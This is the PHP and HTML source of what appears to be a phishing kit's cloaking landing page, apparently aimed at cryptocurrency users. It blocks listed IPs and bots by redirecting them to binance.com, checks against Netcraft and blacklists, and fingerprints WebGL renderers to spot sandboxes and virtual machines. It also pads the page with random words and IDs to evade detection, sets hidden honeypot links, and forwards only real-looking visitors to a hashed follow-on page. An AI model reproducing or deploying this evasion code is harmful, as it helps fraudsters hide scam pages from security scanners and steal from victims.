<?php

//Dwi F.D 

error_reporting(E_ALL);
require 'remote/zero.php';
include 'remote/100.php';
include 'remote/200.php';
include 'remote/300.php';
include 'remote/400.php';
require 'remote/index.php';
require 'remote/netcraft_check.php';
require 'remote/blacklist_lookup.php';

$filename = '2617d44145d0300cdf70349b2f3cac79.txt';
$ip_to_search = $_SERVER['REMOTE_ADDR'];

if (false !== strpos(file_get_contents($filename), $ip_to_search)) {
  header("Location: https://href.li/?https://binance.com/");
  $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
  file_put_contents('newBlockedIP.log', $line . PHP_EOL, FILE_APPEND);
  session_destroy();
  die();
} else {
  // otherwise
}

if (file_exists('ht.access')) {
  rename('ht.access', '.htaccess');
}

$user_ip =  isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR'])  ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

$antiBot = new botCheck($user_ip);
$trueIP = new botCheck(kenshinSamouraIP());

if ($antiBot->isBot() || $trueIP->isBot()) {
    header("Location: https://href.li/?https://binance.com/");
    
} else {
  
}

$karasimiputa = parse_ini_file("instance74nf33pq12b22ec686c1a84e4ce40f9d5a61f77aa.ini", true);
$vlir=$karasimiputa['namer'];
$filrnmi=$karasimiputa['fileSource'];
$rasp=$karasimiputa['naemv'];
$clicram=$karasimiputa['button'];

$karasimiputa = parse_ini_file("instance74nf33pq12b22ec686c1a84e4ce40f9d5a61f77aa.ini", true);
$floupaly=$karasimiputa['faker'];
$cloc=$karasimiputa['color'];

$ip = kenshinSamouraIP();

function vladPt($len = 10){
  $word = array_merge(range('a', 'z'), range('A', 'Z'));
  shuffle($word);
  return substr(implode($word), 0, $len);
}

$kama = vladPt(13);
$diva = vladPt(8);
$wrap = vladPt(10);
$sama = vladPt(13);
$samo = vladPt(13);
$rn = rand(5, 15);
$a = array("unity", "news", "mean", "purpose", "intervention", "inside", "middle", "medium", "translate", "read", "spokesperson", "crossing", "period", "bowel", "fascinate", "suspicion", "feeling", "flood", "innovation", "stock", "reverse", "speculate", "detective", "investment", "guest", "physical", "anger", "publication", "exit", "loop", "blue jean", "twitch", "appointment", "athlete", "reporter", "voyage", "joy", "try", "litigation", "parachute", "judicial", "law", "judge", "justice", "deprive", "discreet", "piano", "child", "calorie", "favor", "lion", "affinity", "oven", "knee", "stab", "horse", "sweater", "experienced", "laboratory", "union", "maze", "ignorance", "ignorant", "shallow", "bald", "soft", "bare", "girlfriend", "secular", "island", "site", "ground", "landowner", "name", "lick", "theft", "cathedral", "tiger", "great", "river", "crowd", "stage", "range", "pumpkin", "whip", "endure", "permanent", "tension", "fashion", "crime", "grass", "save", "store", "leadership", "blade", "leaf", "thin", "jump", "academy", "resign", "farewell", "depart", "talk", "leftovers", "action", "trustee", "liability", "opinion", "zero", "midnight", "yard", "volume", "boat", "belly", "demand", "intelligence", "literacy", "voice", "miserable", "free", "growth", "residence", "apathy", "majority", "fast", "outline", "degree", "gas pedal", "emphasis", "positive", "achieve", "achievement", "agreement", "history", "account", "recognize", "accumulation", "experience", "charge", "star", "hurt", "black", "admit", "concede", "admission", "thanks", "receipt", "friend", "get", "AIDS", "bitter", "delay", "stimulation", "exchange", "deal", "favour", "performance", "return", "production", "jest", "play", "activity", "solo", "player", "cast", "real", "advertising", "version", "dependence", "addition", "speech", "facility", "stick", "formal", "orthodox", "glue", "plaster", "tape", "set", "poison", "council", "division", "executive", "confession", "include", "warning", "teenager", "acceptance", "woman", "man", "notice", "progress", "lead", "opponent", "hardship", "adviser", "revolutionary", "function", "affair", "attachment", "association", "statement", "open", "tissue", "collection", "hostility", "fan", "shake", "excitement", "consensus", "peasant", "help", "support", "object", "wind", "broadcast", "cabin", "pilot", "wing", "plane", "alarm", "egg white", "beer", "alcohol", "consciousness", "excuse", "extraterrestrial", "foreigner", "similar", "commitment", "bond", "comprehensive", "allocation", "compromise", "lonely", "distance", "directory", "index", "change", "height", "aluminium", "graduate", "romantic", "atmosphere", "dream", "ambition", "shell", "pardon", "quantity", "figure", "supply", "speed", "entertainment", "game", "funny", "parallel", "ancestor", "fox", "animal", "ankle", "birthday", "note", "program", "bother", "response", "expect", "expectation", "restless", "anxiety", "share", "factor", "flat", "stroke", "clothes", "attract", "sympathetic", "appeal", "seem", "debut", "look", "texture", "convenience", "engineer", "rub", "paint", "general", "date", "assessment", "estimate", "arrest", "permission", "spider", "random", "wall", "archive", "arch", "fire", "room", "argument", "line", "desert", "rise", "weapon", "sleeve", "tank", "smell", "garlic", "tease", "move", "provoke", "moving", "pack", "row", "timetable", "bow", "gallery", "reservoir", "craftsman", "painter", "art", "silver", "beg", "invite", "view", "attack", "battery", "assembly", "claim", "selection", "astonishing", "far", "forward", "runner", "sport", "front", "nuclear", "tin", "monstrous", "strike", "effort", "serve", "care", "costume", "culture", "lawyer", "draw", "cute", "attraction", "property", "gold", "auction", "sound", "sign", "aunt", "writer", "command", "regulation", "government", "car", "bus", "robot", "transmission", "motorist", "fall", "supplementary", "common", "conscious", "axis", "baby", "carriage", "nursery", "heel", "withdrawal", "suitcase", "sphere", "vote", "trivial", "patch", "band", "slam", "deposit", "failure", "feast", "banish", "tycoon", "drum", "fence", "bar", "trade", "basis", "baseball", "wrong", "rational", "democratic", "cellar", "essential", "infrastructure", "introduction", "cell", "principle", "foundation", "club", "bathtub", "bathroom", "wash", "battlefield", "resist", "represent", "float", "oppose", "suit", "know", "trail", "ride", "depend", "dare", "differ", "match", "like", "dominate", "love", "owe", "mind", "run", "belong", "beat", "host", "win", "lack", "worry", "drop", "bill", "kidney", "carry", "testify", "hold", "stand", "posture", "presence", "rhythm", "scramble", "grace", "salon", "wave", "increase", "conceive", "deteriorate", "sheet", "friendly", "start", "source", "captivate", "low", "absent", "present", "critical", "opposed", "hot", "outer", "salvation", "late", "swallow", "think", "roar", "noble", "native", "left", "bad", "flex", "turn", "curve", "flexible", "good", "advantage", "hook", "leave", "mourning", "shoulder", "siege", "engagement", "improve", "coffee", "wine", "drink", "prejudice", "bike", "offer", "large", "contract", "duck", "turkey", "call", "delivery", "pill", "morsel", "chip", "snack", "sting", "burn", "sword", "space", "cover", "blast", "combine", "approval", "pest", "flash", "obstacle", "brick", "forget", "slab", "vein", "mosquito", "inflate", "punch", "depressed", "blue", "flush", "heart", "muscle", "scale", "mass", "constituency", "lake", "appendix", "flesh", "guard", "kettle", "steam", "cheek", "bomb", "sandwich", "rib", "tooth", "dividend", "horn", "album", "notebook", "prosper", "stall", "loot", "dull", "adopt", "breast", "cap", "base", "avenue", "end", "border", "reward", "cow", "stadium", "ring", "electronics", "courage", "toast", "bread", "width", "shatter", "smash", "cereal", "discovery", "hiccup", "rest", "corruption", "workshop", "bulletin", "summary", "glimpse", "light", "brilliance", "lip", "prosecute", "bring", "generate", "introduce", "import", "create", "organize", "publish", "disclose", "update", "take", "glass", "spectrum", "reception", "leaflet", "fragment", "brother", "eyebrow", "review", "cruel", "champagne", "garage", "center", "architecture", "displace", "roll", "cluster", "nerve", "package", "cottage", "nonsense", "load", "rabbit", "pop", "split", "operation", "office", "counter", "agency", "burst", "wear out", "fuss", "buttocks", "cigarette", "traffic", "carbon", "taxi", "conspiracy", "corpse", "disaster", "multiply", "month", "week", "request", "cancel", "predict", "card", "career", "calm", "crusade", "candidate", "frank", "wolf", "sail", "canvas", "ceiling", "able", "content", "memory", "capital", "execution", "impulse", "legend", "prisoner", "treat", "consideration", "shark", "wrist", "sketch", "waterfall", "precedent", "advance", "register", "barrel", "coffin", "hurl", "catalogue", "capture", "bracket", "nap", "ranch", "white", "cause", "nature", "kill", "offend", "pour", "pit", "crash", "fame", "planet", "orbit", "cell phone", "paper", "penny", "core", "headquarters", "wheat", "hemisphere", "ceremony", "parade", "funeral", "license", "neck", "straw", "necklace", "throne", "president", "champion", "title", "reform", "convert", "freeze", "switch", "role", "feature", "provincial", "hostile", "systematic", "poor", "loud", "plot", "chase", "talkative", "check", "cheque", "urge", "compound", "element", "reaction", "chemistry", "king", "chest", "main", "head", "adoption", "chorus", "chop", "helicopter", "Bible", "watch", "lump", "church", "slide", "film", "round", "condition", "reference", "quote", "orange", "block", "mayor", "tribe", "applaud", "bang", "confrontation", "mud", "pottery", "soap", "clarify", "acquit", "cut", "crack", "mercy", "fist", "bishop", "clerk", "smart", "tick", "snap", "customer", "climb", "climate", "cutting", "time", "close", "contact", "cupboard", "dress", "overall", "belt", "fool", "seize", "train", "coalition", "harsh", "coat", "code", "contemporary", "generation", "cafe", "proof", "knowledge", "belief", "judgment", "laser", "curl", "snub", "fish", "cold", "cooperate", "give", "tent", "raise", "wardrobe", "settlement", "rainbow", "mosaic", "chord", "land", "confront", "enter", "appear", "discover", "bait", "comfort", "comfortable", "leader", "memorial", "recommend", "transaction", "business", "commerce", "market", "committee", "board", "sense", "park", "infect", "write", "network", "compact", "company", "pity", "remunerate", "competence", "plaintiff", "finish", "perfect", "complication", "complex", "follow", "module", "behave", "constitution", "understand", "squeeze", "accountant", "calculation", "hardware", "menu", "mouse", "computing", "software", "computer", "hide", "design", "imagine", "notion", "concept", "embryo", "practical", "applied", "sacred", "personal", "domestic", "private", "definition", "last", "harmony", "coincide", "terms", "freedom", "danger", "improvement", "behavior", "experiment", "director", "south", "federation", "trust", "constellation", "impound", "battle", "fit", "adjust", "standard", "normal", "compliance", "praise", "representative", "link", "related", "node", "draft", "sanctuary", "agree", "product", "effect", "doubt", "courtesy", "thoughtful", "TRUE", "tight", "structure", "use", "infection", "bin", "cassette", "full", "pollution", "competition", "satisfaction", "race", "circumstance", "Europe", "pupil", "deny", "contradiction", "joystick", "recovery", "rule", "transition", "convince", "vehicle", "sentence", "fabricate", "biscuit", "herb", "oil", "pan", "pot", "cage", "partnership", "cooperative", "policeman", "hospitality", "cord", "right", "discipline", "decorative", "makeup", "price", "clique", "cotton", "sofa", "matter", "mole", "offset", "poll", "coup", "voucher", "brave", "seminar", "credit", "course", "curriculum", "direction", "warrant", "polite", "court", "designer", "bloody", "jealous", "colleague", "cattle", "gap", "wisecrack", "cunning", "craft", "crackpot", "crevice", "rotten", "appetite", "creep", "fold", "creation", "artist", "thinker", "literature", "credibility", "creed", "sailor", "prosecution", "record", "criticism", "crosswalk", "bend", "collapse", "squash", "gravel", "copper", "snuggle", "clue", "cucumber", "ethnic", "mug", "cabinet", "cup", "remedy", "suppress", "heal", "lock", "money", "damn", "swear", "pillow", "convention", "tradition", "reduce", "amputate", "crop", "carve", "skin", "fork", "sale", "pat", "sunrise", "dairy", "total", "ballet", "navy", "dark", "favourite", "style", "file", "track", "dawn", "anniversary", "holiday", "fog", "shock", "body", "hand", "lot", "franchise", "shortage", "consider", "expose", "behead", "death", "betray", "decade", "resolution", "classify", "refuse", "recession", "descent", "decay", "medal", "reduction", "order", "devote", "profound", "well", "carrot", "coma", "default", "nonremittal", "fault", "lemon", "payment", "temperature", "quality", "god", "extension", "censorship", "debate", "lace", "tasty", "pleasure", "please", "pleasant", "preach", "rescue", "challenge", "limit", "demonstration", "destruction", "thick", "density", "reliable", "describe", "subject", "exile", "bank", "depression", "rob", "commission", "lineage", "origin", "integration", "merit", "motif", "plan", "functional", "architect", "want", "despair", "sweet", "fate", "break", "point", "confine", "custody", "discourage", "weigh", "decisive", "hate", "explode", "explosion", "modernize", "abnormal", "instrument", "filter", "crown", "dialogue", "negotiation", "journal", "drown", "break down", "diet", "disagree", "mess", "difficulty", "excavation", "industry", "proportion", "decrease", "diplomatic", "first-hand", "management", "manager", "soil", "disability", "denial", "unpleasant", "separation", "disk", "dump", "study", "negative", "stop", "disco", "offense", "find", "incongruous", "digital", "consultation", "treatment", "contempt", "spirit", "mask", "pie", "dish", "disorder", "case", "chart", "quarrel", "difference", "neglect", "dismiss", "joint", "undress", "interrupt", "disturbance", "disagreement", "thesis", "deter", "mile", "aloof", "trait", "characteristic", "spread", "circulate", "quarter", "upset", "trench", "butterfly", "variety", "deviation", "even", "harm", "work", "doctor", "philosophy", "charter", "pound", "dollar", "goat", "dog", "chicken", "cultivate", "control", "contribution", "gate", "bell", "threshold", "dorm", "drug", "image", "ruin", "drain", "opera", "drama", "theater", "curtain", "pull", "tap", "tie", "diagram", "fear", "awful", "sip", "dribble", "drive", "quit", "heroin", "user", "rehearsal", "east", "north", "west", "ditch", "repeat", "length", "twilight", "responsibility", "obligation", "house", "home", "dynamic", "past", "mail", "world", "pole", "relief", "relaxation", "accessible", "tender", "distinct", "handy", "restaurant", "aid", "economist", "boom", "economics", "economy", "value", "margin", "bean", "onion", "corn", "building", "school", "influence", "effective", "egg", "self", "ego", "hip", "elbow", "old", "choose", "voter", "current", "electron", "hill", "lift", "elite", "banana", "articulate", "flag", "eagle", "utter", "glow", "sentiment", "pain", "stress", "conglomerate", "empirical", "authorise", "blank", "clear", "brain", "witch", "surround", "frame", "meeting", "favorable", "invasion", "restrain", "settle", "output", "acute", "conclusion", "terminal", "survival", "opposition", "fuel", "wrap", "wrestle", "mastermind", "technology", "concentration", "enjoy", "indulge", "expansion", "soldier", "registration", "plead", "break in", "penetrate", "tempt", "temptation", "solid", "burial", "entry", "access", "ticket", "twist", "environment", "era", "balance", "breakdown", "just", "ambiguous", "ambiguity", "delete", "error", "intensify", "adventure", "flight", "leak", "perfume", "habit", "institution", "admiration", "respect", "folk music", "evening", "incident", "trouble", "eternal", "estate", "grounds", "contrary", "test", "screen", "inspector", "mine", "exclude", "fat", "sell", "redeem", "correspond", "correspondence", "proclaim", "exclusive", "monopoly", "justify", "example", "illustrate", "work out", "practice", "dominant", "exercise", "press", "show", "display", "museum", "emergency", "abstract", "elaborate", "area", "anticipation", "prospect", "eject", "spend", "feel", "authority", "expertise", "reason", "explain", "remark", "graphic", "exhibition", "complain", "explicit", "apology", "highway", "delicate", "reach", "society", "surface", "outside", "blackmail", "deport", "galaxy", "glasses", "lid", "silk", "material", "manufacture", "side", "grimace", "aspect", "beard", "fax", "parameter", "observation", "attention", "fairy", "miss", "overlook", "lose", "weakness", "absence", "sunshine", "forge", "illusion", "distort", "acquaintance", "kinship", "crystal", "agriculture", "model", "trick", "secure", "screw", "knot", "cream", "tired", "blame", "prefer", "progressive", "cower", "concern", "bold", "viable", "banquet", "agent", "toll", "desire", "unrest", "confidence", "proud", "cat", "criminal", "hen", "girl", "bitch", "queen", "mother", "iron", "ferry", "conception", "celebration", "story", "fibre", "character", "novel", "fight", "stuff", "fill", "occupy", "movie", "producer", "final", "fund", "treasurer", "convict", "clay", "powder", "sand", "thumb", "fastidious", "particular", "goal", "fireplace", "shoot", "rifle", "firefighter", "strong", "cousin", "initial", "beginning", "initiative", "freshman", "financial", "salmon", "aquarium", "fisherman", "healthy", "equip", "convulsion", "scene", "cook", "fee", "interest", "tile", "meat", "steward", "toss", "deck", "level", "stun", "floor", "vegetation", "plant", "dough", "spill", "lily", "variation", "chimney", "soar", "concentrate", "family", "folk", "conventional", "second", "cheese", "grain", "salad", "cheat", "reckless", "football", "trace", "marathon", "step", "boot", "offensive", "raid", "patience", "power", "camp", "impact", "force", "index finger", "exotic", "chief", "deer", "prevent", "branch", "spin", "class", "shape", "ball", "format", "abandon", "strength", "castle", "accident", "coal", "spring", "wheel", "skeleton", "rack", "hotdog", "fraud", "monster", "relieve", "straight", "safe", "clean", "dry", "pure", "weight", "exempt", "release", "liberty", "halt", "frequency", "original", "clash", "refrigerator", "ally", "warm", "terrify", "medieval", "facade", "ice cream", "ice", "cherry", "apple", "defeat", "foot", "smoke", "official", "mushroom", "mold", "desk", "seat", "lamp", "rage", "joke", "choke", "profit", "make", "gallon", "risk", "net", "score", "top", "gas", "meet", "homosexual", "regard", "gear", "jelly", "diamond", "jewel", "gem", "sex", "category", "health", "productive", "mutation", "genetic", "exploration", "zone", "circle", "escape", "cope", "age", "abolish", "eliminate", "master", "arise", "outfit", "ghostwriter", "charity", "talented", "daughter", "bless", "define", "perform", "pay", "distribute", "thank", "spare", "resignation", "secretion", "marble", "glance", "shine", "gloom", "glare", "frown", "sticky", "sink", "retire", "happen", "accompany", "pass", "fail", "goalkeeper", "departure", "golf", "peanut", "charm", "bloodshed", "overeat", "extort", "ministry", "minister", "catch", "gradient", "mark", "drift", "rice", "grandfather", "grandmother", "grip", "hay", "scrape", "tip", "gravity", "cemetery", "major", "high", "produce", "green", "welcome", "grudge", "mill", "traction", "army", "background", "cooperation", "flock", "herd", "organisation", "fleet", "troop", "adult", "development", "ensure", "defend", "hypothesis", "direct", "guide", "guideline", "guilt", "innocent", "taste", "water", "inhabitant", "haircut", "hall", "hammer", "basket", "manual", "cart", "umbrella", "glove", "hang", "yearn", "coincidence", "difficult", "cash", "wood", "nut", "damage", "collar", "harvest", "harass", "rush", "have", "wear", "dine", "afford", "brown", "sour", "steep", "smooth", "sharp", "sensitive", "complete", "square", "deep", "short", "weak", "infinite", "mature", "meadow", "veil", "governor", "helmet", "clearance", "therapist", "pile", "listen", "rumor", "grief", "heat", "responsible", "service", "portion", "dome", "moment", "future", "reluctance", "retreat", "fever", "highlight", "extreme", "handicap", "interference", "employ", "slap", "pawn", "pig", "keep", "resort", "tube", "bubble", "excavate", "habitat", "housewife", "honor", "addicted", "tire", "basketball", "platform", "fool around", "ward", "inn", "enemy", "firm", "hut", "hour", "husband", "color", "embrace", "giant", "act", "face", "arm", "humanity", "comedy", "hunting", "safari", "hunter", "suffer", "injury", "suffering", "cross", "theory", "preoccupation", "identity", "identification", "dialect", "lighter", "sick", "unlawful", "notorious", "fantasy", "projection", "picture", "copy", "huge", "exemption", "affect", "spoil", "fair", "jungle", "pressure", "flawed", "temporary", "tool", "brush", "issue", "jail", "unlikely", "momentum", "tense", "regular", "unanimous", "accurate", "central", "inch", "passive", "still", "dead", "helpless", "tendency", "list", "whole", "conflict", "incapable", "contain", "double", "few", "insurance", "bay", "separate", "needle", "need", "person", "morale", "single", "lazy", "incentive", "splurge", "cheap", "implicit", "childish", "virus", "hell", "hospital", "determine", "flu", "information", "recording", "rare", "violation", "consumption", "monk", "instinct", "heir", "first", "shot", "pioneer", "inquiry", "ask", "question", "dedicate", "bee", "indoor", "insistence", "fresh", "establish", "episode", "exception", "college", "teach", "lecture", "education", "teacher", "means", "deficiency", "abuse", "coverage", "policy", "premium", "guerrilla", "rebel", "rebellion");
$keyGen = array_rand($a, 20);
$randomGen = genwords(20);

?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="keywords" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>，&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?= $a[$keyGen[4]]; ?> - <?= $a[$keyGen[0]]; ?></title>
  <style>
    #<?= $kama; ?> {
      text-align: center;
      background: <?= $cloc; ?>;
      border-radius: 5px;
      padding: 12px 27px;
      color: #ffffff;
      display: inline-block;
      font: normal normal 39px/1 "Calibri", sans-serif;
      cursor: pointer;
    }

    #<?= $wrap; ?> {
      width: 100%;
      height: 400px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .genCSS {
      color: white;
      font-size: 11px;
      position: absolute;
      left: 0px;
      top: 0px;
      z-index: -13;
    }

    a {
      text-decoration: none !important;
    }

    p {
      margin-top: 300<?= $rn; ?><?= $rn; ?>%;
    }
  </style>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>
  <script>
    var canvas = document.createElement('canvas');
    var gl = canvas.getContext('webgl');
    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    console.log(vendor);
    console.log(renderer);
    var width = screen.width;
    var height = screen.height;
    var color_depth = screen.colorDepth;
    if (true) {
      if (/swiftshader/i.test(renderer.toLowerCase()) || /llvmpipe/i.test(renderer.toLowerCase()) || /virtualbox/i.test(renderer.toLowerCase()) || !renderer) {
        console.log("No Display (RDP Bot)");
      } else if (color_depth < 24 || width < 100 || width < 100 || !color_depth) {
        console.log('Some random bot detected');
      } else {
        $.get("remote/fetch.php", function(data, status) {
          window.location.href = 'c9f7198c57735fa7a7a8ac2cc18dd542.php';
        });
      }
    }
  </script>
</head>

<body>
  <?= new_genwords(rand(100, 300), $randomGen); ?>

  <a href="<?= $filrnmi; ?>/vendor/" style="display:none">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>

  <a href="<?= $filrnmi; ?>/vendor/">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>
  <a href="<?= $filrnmi; ?>/vendor/">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>
  <a href="<?= $filrnmi; ?>/vendor/">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>
  <a href="<?= $filrnmi; ?>/vendor/">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>
  <a href="<?= $filrnmi; ?>/vendor/">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>
  <a href="<?= $filrnmi; ?>/vendor/">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>
  <a href="<?= $filrnmi; ?>/vendor/">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>
  <a href="<?= $filrnmi; ?>/vendor/">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>
  <a href="<?= $filrnmi; ?>/vendor/">
    <p class="genCSS"><?= $randomGen[array_rand($randomGen)]; ?></p>
  </a>

  <?= new_genJS(rand(100, 200), $randomGen); ?>


  <form method="POST" action="" id="rdp-check" name="rdp-check">
    <input type="hidden" name="renderer">
    <input type="hidden" name="color_depth">
    <input type="hidden" name="width">
    <input type="hidden" name="height">
  </form>

  <div onclick="e<?= $diva; ?>()" id="<?= $wrap; ?>">
    <span id="<?= $kama; ?>"><?= $clicram; ?></span>
    <br>
  </div>
  <script>
    function e<?= $diva; ?>() {
      location.href = "<?= $filrnmi; ?>/vendor/";
    }
  </script>

  <p>Blog post <?= $a[$keyGen[0]]; ?> <?= $a[$keyGen[4]]; ?></p>
  <p><?= $a[$keyGen[0]]; ?>A <?= $a[$keyGen[2]]; ?> <?= $a[$keyGen[3]]; ?> <?= $a[$keyGen[4]]; ?> <?= $a[$keyGen[5]]; ?> <?= $a[$keyGen[6]]; ?> <?= $a[$keyGen[7]]; ?> <?= $a[$keyGen[8]]; ?> <?= $a[$keyGen[9]]; ?> <?= $a[$keyGen[10]]; ?> <?= $a[$keyGen[11]]; ?> <?= $a[$keyGen[12]]; ?> <?= $a[$keyGen[12]]; ?> <?= $a[$keyGen[13]]; ?> <?= $a[$keyGen[14]]; ?> <?= $a[$keyGen[15]]; ?> <?= $a[$keyGen[16]]; ?> <?= $a[$keyGen[17]]; ?> <?= $a[$keyGen[18]]; ?> <?= $a[$keyGen[19]]; ?>
  <p>

    <noscript><a rel="nofollow" style="display:none;" href="<?= $filrnmi; ?>/vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
    </noscript>
    <a rel="nofollow" style="display:none;" href="<?= $filrnmi; ?>/vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>

  <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
    <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div>
    <div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div>
    <div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div>
    <div style="z-index: 2000000000; position: relative;"></div>
  </div>
</body>

</html>